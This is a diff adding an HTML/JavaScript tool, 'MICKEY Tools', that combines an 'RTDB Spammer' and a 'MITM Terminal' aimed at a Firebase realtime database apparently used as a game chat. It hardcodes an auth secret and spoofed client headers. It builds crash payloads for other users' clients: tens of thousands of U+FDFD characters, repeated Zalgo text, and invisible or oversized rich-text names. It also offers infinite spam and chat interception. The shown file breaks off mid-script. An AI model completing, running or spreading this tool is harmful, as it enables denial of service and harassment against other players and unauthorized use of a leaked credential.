@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MICKEY TOOLS</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --primary-light: #dbeafe;
+            --bg: #f8fafc;
+            --surface: #ffffff;
+            --border: #e2e8f0;
+            --text: #1e293b;
+            --text-muted: #64748b;
+            --text-dim: #94a3b8;
+            --success: #10b981;
+            --danger: #ef4444;
+            --info: #3b82f6;
+            --warn: #f59e0b;
+            --shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 640px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--primary-light);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: -0.5px;
+            margin-bottom: 4px;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 4px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+            color: var(--text-muted);
+            background: transparent;
+        }
+
+        .tab-btn.active {
+            background: var(--surface);
+            color: var(--primary);
+            box-shadow: var(--shadow);
+        }
+
+        .tab-panel { display: none; }
+        .tab-panel.active { display: block; }
+
+        /* Sections */
+        .section {
+            margin-bottom: 24px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .section:last-of-type {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .section-title {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 16px;
+        }
+
+        .form-group { margin-bottom: 16px; }
+        .form-group:last-child { margin-bottom: 0; }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--text-muted);
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="number"],
+        textarea {
+            width: 100%;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 14px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s ease;
+        }
+
+        input[type="text"]:hover,
+        input[type="number"]:hover,
+        textarea:hover { border-color: var(--primary); }
+
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--primary-light);
+            background: var(--surface);
+        }
+
+        textarea { min-height: 90px; resize: vertical; line-height: 1.5; }
+        textarea:disabled { background: #e2e8f0; cursor: not-allowed; opacity: 0.6; }
+
+        .row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+
+        /* Popout */
+        .menu-container { position: relative; display: block; margin-bottom: 12px; }
+
+        .btn-lag {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--primary-light);
+            color: var(--primary);
+            border: 1px solid var(--primary-light);
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .btn-lag:hover { background: var(--primary); color: white; }
+        .btn-lag::after { content: '▼'; font-size: 10px; transition: transform 0.2s; }
+        .btn-lag.active::after { transform: rotate(180deg); }
+
+        .popout-list {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: var(--surface);
+            box-shadow: var(--shadow-lg);
+            margin: 4px 0 0 0;
+            list-style-type: none;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            z-index: 100;
+            overflow: hidden;
+        }
+
+        .popout-list.show { display: block; animation: slideDown 0.2s ease; }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .popout-list li {
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .popout-list li:last-child { border-bottom: none; }
+        .popout-list li:hover { background: var(--primary-light); color: var(--primary); }
+        .lag-name { font-weight: 600; font-size: 13px; }
+        .lag-desc { font-size: 11px; color: var(--text-muted); }
+
+        /* File input */
+        .file-input-wrapper { position: relative; overflow: hidden; }
+        .file-input-wrapper input[type="file"] { position: absolute; opacity: 0; width: 0; height: 0; }
+
+        .file-btn {
+            display: block;
+            width: 100%;
+            background: var(--bg);
+            border: 1px dashed var(--border);
+            border-radius: 8px;
+            padding: 12px 14px;
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .file-btn:hover { border-color: var(--primary); color: var(--primary); background: var(--primary-light); }
+        .file-btn.has-file { border-style: solid; border-color: var(--primary); color: var(--primary); background: var(--primary-light); }
+
+        /* Toggles */
+        .toggle-group {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 10px;
+            transition: all 0.2s ease;
+        }
+
+        .toggle-group:hover { border-color: var(--primary); }
+        .toggle-group.active { border-color: var(--primary); background: var(--primary-light); }
+        .toggle-label { color: var(--text); font-size: 14px; font-weight: 500; }
+        .toggle-desc { color: var(--text-muted); font-size: 12px; margin-top: 2px; }
+
+        .toggle-switch { position: relative; width: 44px; height: 24px; flex-shrink: 0; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #cbd5e1;
+            border-radius: 24px;
+            transition: 0.3s;
+        }
+
+        .slider::before {
+            position: absolute;
+            content: "";
+            height: 18px; width: 18px;
+            left: 3px; bottom: 3px;
+            background: white;
+            border-radius: 50%;
+            transition: 0.3s;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        input:checked + .slider { background: var(--primary); }
+        input:checked + .slider::before { transform: translateX(20px); }
+
+        /* Buttons */
+        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+
+        .btn {
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .btn-spam { background: var(--primary); color: white; }
+        .btn-spam:hover:not(:disabled) { background: var(--primary-hover); transform: translateY(-1px); box-shadow: var(--shadow-lg); }
+
+        .btn-stop { background: var(--danger); color: white; display: none; }
+        .btn-stop:hover { background: #dc2626; transform: translateY(-1px); box-shadow: var(--shadow-lg); }
+
+        .btn-connect-mitm { background: var(--success); color: white; width: 100%; }
+        .btn-connect-mitm:hover:not(:disabled) { background: #059669; transform: translateY(-1px); box-shadow: var(--shadow-lg); }
+        .btn-connect-mitm.disconnecting { background: var(--danger); }
+
+        .btn-send-mitm { background: var(--info); color: white; }
+        .btn-send-mitm:hover:not(:disabled) { background: #2563eb; transform: translateY(-1px); box-shadow: var(--shadow-lg); }
+
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+
+        /* Status */
+        .status {
+            margin-top: 16px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            display: none;
+            border: 1px solid transparent;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .status.active { display: block; }
+        .status.success { background: #ecfdf5; border-color: #a7f3d0; color: var(--success); }
+        .status.error { background: #fef2f2; border-color: #fecaca; color: var(--danger); }
+        .status.info { background: #eff6ff; border-color: #bfdbfe; color: var(--info); }
+        .status.warn { background: #fffbeb; border-color: #fde68a; color: var(--warn); }
+
+        /* Log / Terminal (shared) */
+        .log-container {
+            margin-top: 16px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .log-header {
+            padding: 12px 16px;
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .log-clear { color: var(--text-dim); cursor: pointer; font-size: 12px; transition: color 0.2s; padding: 4px 8px; border-radius: 4px; }
+        .log-clear:hover { color: var(--danger); background: #fef2f2; }
+
+        .log {
+            padding: 12px 16px;
+            max-height: 240px;
+            overflow-y: auto;
+            font-family: 'Inter', sans-serif;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .log::-webkit-scrollbar { width: 6px; }
+        .log::-webkit-scrollbar-track { background: transparent; }
+        .log::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
+
+        .log-entry { padding: 4px 0; color: var(--text-muted); animation: fadeIn 0.2s ease; word-break: break-word; }
+        .log-entry.ok { color: var(--success); }
+        .log-entry.fail { color: var(--danger); }
+        .log-entry.info { color: var(--info); }
+        .log-entry.in { color: var(--success); }
+        .log-entry.out { color: var(--primary); }
+        .log-entry.sys { color: var(--text-muted); }
+        .log-entry.warn { color: var(--warn); }
+
+        .stats-bar {
+            display: flex;
+            gap: 20px;
+            padding: 12px 16px;
+            border-top: 1px solid var(--border);
+            background: var(--surface);
+        }
+
+        .stat-item { display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--text-muted); font-weight: 500; }
+        .stat-dot { width: 8px; height: 8px; border-radius: 50%; }
+        .stat-dot.ok { background: var(--success); }
+        .stat-dot.fail { background: var(--danger); }
+        .stat-dot.total { background: var(--info); }
+        .stat-dot.in { background: var(--success); }
+        .stat-dot.out { background: var(--primary); }
+
+        /* Connection dot */
+        .conn-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); display: inline-block; margin-right: 6px; transition: all 0.3s ease; }
+        .conn-dot.online { background: var(--success); box-shadow: 0 0 6px rgba(16,185,129,0.4); }
+        .conn-dot.polling { background: var(--warn); }
+
+        /* MITM send row */
+        .send-row { display: flex; gap: 12px; align-items: flex-start; }
+        .send-row .form-group { flex: 1; margin-bottom: 0; }
+        .send-row .btn { width: auto; padding: 12px 20px; margin-top: 24px; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        .pulse { animation: pulse 1.5s infinite; }
+
+        @media (max-width: 520px) {
+            .row, .btn-group { grid-template-columns: 1fr; }
+            .send-row { flex-direction: column; }
+            .send-row .btn { margin-top: 0; width: 100%; }
+            body { padding: 20px 12px; }
+            .container { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>MICKEY Tools</h1>
+            <p class="subtitle">RTDB Spammer + MITM Terminal</p>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('spam')">💥 Spammer</button>
+            <button class="tab-btn" onclick="switchTab('mitm')">🔍 MITM</button>
+        </div>
+
+        <!-- ==================== SPAM TAB ==================== -->
+        <div id="tab-spam" class="tab-panel active">
+
+            <div class="section">
+                <div class="section-title">Target</div>
+                <div class="form-group">
+                    <label>JobID (UUID)</label>
+                    <input type="text" id="s-jobid" placeholder="b09b92bc-e48b-4089-9537-9dfe0142c4ee">
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="section-title">Identity (Name)</div>
+                <div class="menu-container">
+                    <button id="s-popBtn" class="btn-lag">Select Name Preset</button>
+                    <ul id="s-popList" class="popout-list">
+                        <li onclick="setNamePreset('ping')"><span class="lag-name">Lag Ping</span><span class="lag-desc">Custom count</span></li>
+                        <li onclick="setNamePreset('fps')"><span class="lag-name">Lag FPS</span><span class="lag-desc">Custom count</span></li>
+                        <li onclick="setNamePreset('cover')"><span class="lag-name">Cover</span><span class="lag-desc">Zalgo ×<span id="cover-repeat-preview">100</span></span></li>
+                        <li onclick="setNamePreset('super')"><span class="lag-name">Lag Super</span><span class="lag-desc">Zalgo ×<span id="super-repeat-preview">100</span></span></li>
+                        <li onclick="setNamePreset('manual')"><span class="lag-name">Manual</span><span class="lag-desc">Custom name</span></li>
+                    </ul>
+                </div>
+
+                <div class="row" id="zalgo-repeat-row" style="display:none; margin-bottom:4px;">
+                    <div class="form-group">
+                        <label>Cover Repeat (×)</label>
+                        <input type="number" id="cover-repeat" value="100" min="1" max="500" oninput="updateRepeatPreview()">
+                    </div>
+                    <div class="form-group">
+                        <label>Lag Super Repeat (×)</label>
+                        <input type="number" id="super-repeat" value="100" min="1" max="500" oninput="updateRepeatPreview()">
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="form-group">
+                        <label>Name</label>
+                        <input type="text" id="s-name" value="LAGGER" placeholder="Sender name">
+                    </div>
+                    <div class="form-group">
+                        <label>Name File (.txt)</label>
+                        <div class="file-input-wrapper">
+                            <input type="file" id="s-nameFile" accept=".txt" onchange="loadFile('s-nameFile', 's-name')">
+                            <label for="s-nameFile" class="file-btn" id="s-nameFileLabel">Choose file...</label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="section-title">Message</div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>Message</label>
+                        <textarea id="s-message" placeholder="Enter message or Zalgo...">CRASH</textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Message File (.txt)</label>
+                        <div class="file-input-wrapper">
+                            <input type="file" id="s-msgFile" accept=".txt" onchange="loadFile('s-msgFile', 's-message')">
+                            <label for="s-msgFile" class="file-btn" id="s-msgFileLabel">Choose file...</label>
+                        </div>
+                    </div>
+                </div>
+                <div class="row" style="margin-top: 14px;">
+                    <div class="form-group">
+                        <label>Repeat Count</label>
+                        <input type="number" id="s-repeat" value="100" min="1" max="1000">
+                    </div>
+                    <div class="form-group">
+                        <label>Send Count (0 = infinite)</label>
+                        <input type="number" id="s-count" value="10" min="0" placeholder="0 = infinite">
+                    </div>
+                </div>
+            </div>
+
+            <div class="section">
+                <div class="section-title">Toggles</div>
+                <div class="toggle-group" id="tgInfinite">
+                    <div><div class="toggle-label">Infinite Spam</div><div class="toggle-desc">Ignore count, spam forever</div></div>
+                    <label class="toggle-switch"><input type="checkbox" id="s-infiniteSpam" onchange="toggleInfinite()"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-group">
+                    <div><div class="toggle-label">Invisible Name</div><div class="toggle-desc">Font transparency = 1</div></div>
+                    <label class="toggle-switch"><input type="checkbox" id="s-invisibleName"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-group">
+                    <div><div class="toggle-label">Invisible Message</div><div class="toggle-desc">Font transparency = 1</div></div>
+                    <label class="toggle-switch"><input type="checkbox" id="s-invisibleMsg"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-group">
+                    <div><div class="toggle-label">RichText Big Name</div><div class="toggle-desc">Size 100+ for huge text</div></div>
+                    <label class="toggle-switch"><input type="checkbox" id="s-richTextName"><span class="slider"></span></label>
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="btn btn-spam" id="btnSpam" onclick="startSpam()">Start Spam</button>
+                <button class="btn btn-stop" id="btnStop" onclick="stopSpam()">Stop</button>
+            </div>
+
+            <div class="status" id="s-status"></div>
+
+            <div class="log-container" id="s-logContainer">
+                <div class="log-header">
+                    <span>Execution Log</span>
+                    <span class="log-clear" onclick="clearSpamLog()">Clear</span>
+                </div>
+                <div class="log" id="s-log"></div>
+                <div class="stats-bar">
+                    <div class="stat-item"><div class="stat-dot ok"></div> OK: <span id="s-statOk">0</span></div>
+                    <div class="stat-item"><div class="stat-dot fail"></div> Fail: <span id="s-statFail">0</span></div>
+                    <div class="stat-item"><div class="stat-dot total"></div> Total: <span id="s-statTotal">0</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== MITM TAB ==================== -->
+        <div id="tab-mitm" class="tab-panel">
+
+            <div class="section">
+                <div class="section-title">Connection</div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>JobID (UUID)</label>
+                        <input type="text" id="m-jobid" placeholder="b09b92bc-e48b-4089-9537-9dfe0142c4ee">
+                    </div>
+                    <div class="form-group">
+                        <label>Display Name</label>
+                        <input type="text" id="m-name" value="LAGGER" placeholder="Your name">
+                    </div>
+                </div>
+                <div style="margin-top: 14px;">
+                    <button class="btn btn-connect-mitm" id="btnConnect" onclick="toggleConnection()">Connect</button>
+                </div>
+            </div>
+
+            <div class="status" id="m-status"></div>
+
+            <div class="log-container" id="m-terminalContainer">
+                <div class="log-header">
+                    <span><span class="conn-dot" id="connDot"></span>Live Terminal</span>
+                    <span class="log-clear" onclick="clearMITMLog()">Clear</span>
+                </div>
+                <div class="log" id="m-terminal"></div>
+                <div class="stats-bar">
+                    <div class="stat-item"><div class="stat-dot in"></div> In: <span id="m-statIn">0</span></div>
+                    <div class="stat-item"><div class="stat-dot out"></div> Out: <span id="m-statOut">0</span></div>
+                    <div class="stat-item"><div class="stat-dot total"></div> Total: <span id="m-statTotal">0</span></div>
+                </div>
+            </div>
+
+            <div id="m-sendSection" style="display:none; margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border);">
+                <div class="section-title">Send Message</div>
+                <div class="send-row">
+                    <div class="form-group">
+                        <label>Message</label>
+                        <textarea id="m-sendMessage" placeholder="Type message... (Enter to send)" onkeydown="handleMITMEnter(event)"></textarea>
+                    </div>
+                    <button class="btn btn-send-mitm" id="btnSend" onclick="mitmSendMessage()">Send</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ============== SHARED CONFIG ==============
+        const AUTH    = "mPg61dxsDQIQLRJYOyf4nBIw1UUxjH3Zj0fbzLer";
+        const PROJECT = "revivemickey-default-rtdb";
+        const REGION  = "asia-southeast1";
+        const HEADERS = {
+            "Content-Type": "application/json",
+            "Delta-User-Identifier": "0be6ec5260b9020bec0b3badb395ee4c54b8da59dc0625cda8a9c8ea81488b61",
+            "Delta-Fingerprint":     "0be6ec5260b9020bec0b3badb395ee4c54b8da59dc0625cda8a9c8ea81488b61"
+        };
+
+        // ============== TAB SWITCHER ==============
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-btn').forEach((b, i) => b.classList.toggle('active', ['spam','mitm'][i] === tab));
+            document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+            document.getElementById('tab-' + tab).classList.add('active');
+        }
+
+        // ============== SPAM LOGIC ==============
+        let spamStop   = false;
+        let spamActive = false;
+        let spamStats  = { ok: 0, fail: 0, total: 0 };
+        let namePresetMode = 'manual';
+
+        const LAG_CHAR    = '\uFDFD';
+        const ZALGO_COVER = '/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ';
+        const ZALGO_SUPER = '💩💩💩💩🙈🙈🙈🙈/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ۝۞۝۞۝۞۝۞۝۞۝۞۝۞۝۞/̸̶̢̢̡̢̛̛̛̛̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̪̫̝̯̯͈̙̳̰̦͖̭̞̥̝͍̝̯͉̲̳̰̦͖̭̞̥̝͍̝̯͉҉dͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤͩ̀͆ͥ̾ͪͨͭ̒̔ͮ͒ͫͣ͆ͩͮ̃ͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͮͣͪͣͥͤ';
+
+        const popBtn  = document.getElementById('s-popBtn');
+        const popList = document.getElementById('s-popList');
+
+        popBtn.addEventListener('click', (e) => {
+            popList.classList.toggle('show');
+            popBtn.classList.toggle('active');
+            e.stopPropagation();
+        });
+
+        window.addEventListener('click', () => {
+            popList.classList.remove('show');
+            popBtn.classList.remove('active');
+        });
+
+        function setNamePreset(type) {
+            namePresetMode = type;
+            const nameInput = document.getElementById('s-name');
+            let payload = '';
+            switch(type) {
+                case 'ping': {
+                    let c = prompt('Character count for Lag Ping:', '52130');
+                    if (c === null) { closePopout(); return; }
+                    c = parseInt(c) || 52130;
+                    if (c > 100000 && !confirm(`${c.toLocaleString()} chars may lag your browser. Continue?`)) { closePopout(); return; }
+                    payload = LAG_CHAR.repeat(c);
+                    spamLog(`Name Preset: Lag Ping (${c.toLocaleString()}x)`, 'info');
+                    popBtn.textContent = `Lag Ping (${c.toLocaleString()} chars)`;
+                    break;
+                }
+                case 'fps': {
+                    let c = prompt('Character count for Lag FPS:', '7033');
+                    if (c === null) { closePopout(); return; }
+                    c = parseInt(c) || 7033;
+                    payload = LAG_CHAR.repeat(c);
+                    spamLog(`Name Preset: Lag FPS (${c.toLocaleString()}x)`, 'info');
+                    popBtn.textContent = `Lag FPS (${c.toLocaleString()} chars)`;
+                    break;
+                }
+                case 'cover': {
+                    const rpt = parseInt(document.getElementById('cover-repeat').value) || 100;
+                    document.getElementById('zalgo-repeat-row').style.display = 'grid';
+                    payload = ZALGO_COVER.repeat(rpt);
+                    spamLog(`Name Preset: Cover (${rpt}x zalgo)`, 'info');
+                    popBtn.textContent = `Cover (${rpt}x zalgo)`;
+                    break;
+                }
+                case 'super': {
+                    const rpt = parseInt(document.getElementById('super-repeat').value) || 100;
+                    document.getElementById('zalgo-repeat-row').style.display = 'grid';
+                    payload = ZALGO_SUPER.repeat(rpt);
+                    spamLog(`Name Preset: Lag Super (${rpt}x zalgo)`, 'info');
+                    popBtn.textContent = `Lag Super (${rpt}x zalgo)`;
+                    break;
+                }
+                case 'manual':
+                    nameInput.value = '';
+                    nameInput.disabled = false;
+                    nameInput.placeholder = 'Enter custom name...';
+                    nameInput.focus();
+                    spamLog('Mode: Manual name input', 'info');
+                    popBtn.textContent = 'Manual (Custom)';
+                    closePopout();
+                    return;
+            }
+            nameInput.value = payload;
+            nameInput.disabled = true;
+            nameInput.placeholder = 'Name loaded from preset';
+            closePopout();
+        }
+
+        function closePopout() {
+            popList.classList.remove('show');
+            popBtn.classList.remove('active');
+        }
+
+        function updateRepeatPreview() {
+            const coverVal = document.getElementById('cover-repeat').value || 100;
+            const superVal = document.getElementById('super-repeat').value || 100;
+            document.getElementById('cover-repeat-preview').textContent = coverVal;
+            document.getElementById('super-repeat-preview').textContent = superVal;
+        }
+
+        function toggleInfinite() {
+            const infinite = document.getElementById('s-infiniteSpam').checked;
+            const countInput = document.getElementById('s-count');
+            const tg = document.getElementById('tgInfinite');
+            countInput.disabled = infinite;
+            countInput.style.opacity = infinite ? '0.3' : '1';
+            tg.classList.toggle('active', infinite);
+        }
+
+        function loadFile(inputId, targetId) {
+            try {
+                const input = document.getElementById(inputId);
+                const label = document.getElementById(inputId + 'Label');
+                const target = document.getElementById(targetId);
+                if (input.files && input.files[0]) {
+                    const file = input.files[0];
+                    label.textContent = file.name;
+                    label.classList.add('has-file');
+                    const reader = new FileReader();
+                    reader.onload = (e) => {
+                        let text = e.target.result.replace(/\uFEFF/g, '').replace(/\x00/g, '');
+                        target.value = text;
+                        spamLog(`Loaded ${file.name} (${text.length} chars)`, 'info');
+                    };
+                    reader.onerror = () => spamLog(`Failed to read ${file.name}`, 'fail');
+                    reader.readAsText(file);
+                }
+            } catch(e) { spamLog('File load error: ' + e.message, 'fail'); }
+        }
+
+        function spamLog(msg, type = 'info') {
+            const logDiv = document.getElementById('s-log');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function clearSpamLog() {
+            document.getElementById('s-log').innerHTML = '';
+            spamStats = { ok: 0, fail: 0, total: 0 };
+            updateSpamStats();
+        }
+
+        function updateSpamStats() {
+            document.getElementById('s-statOk').textContent    = spamStats.ok;
+            document.getElementById('s-statFail').textContent  = spamStats.fail;
+            document.getElementById('s-statTotal').textContent = spamStats.total;
+        }
+
+        function showSpamStatus(msg, type) {
+            const s = document.getElementById('s-status');
+            s.textContent = msg;
+            s.className = `status active ${type}`;
+        }
+
+        function richtextBig(text, size = 100) { return `<font size="${size}">${text}</font>`; }
+        function invisible(text) { return `<font transparency="1">${text}</font>`; }
+
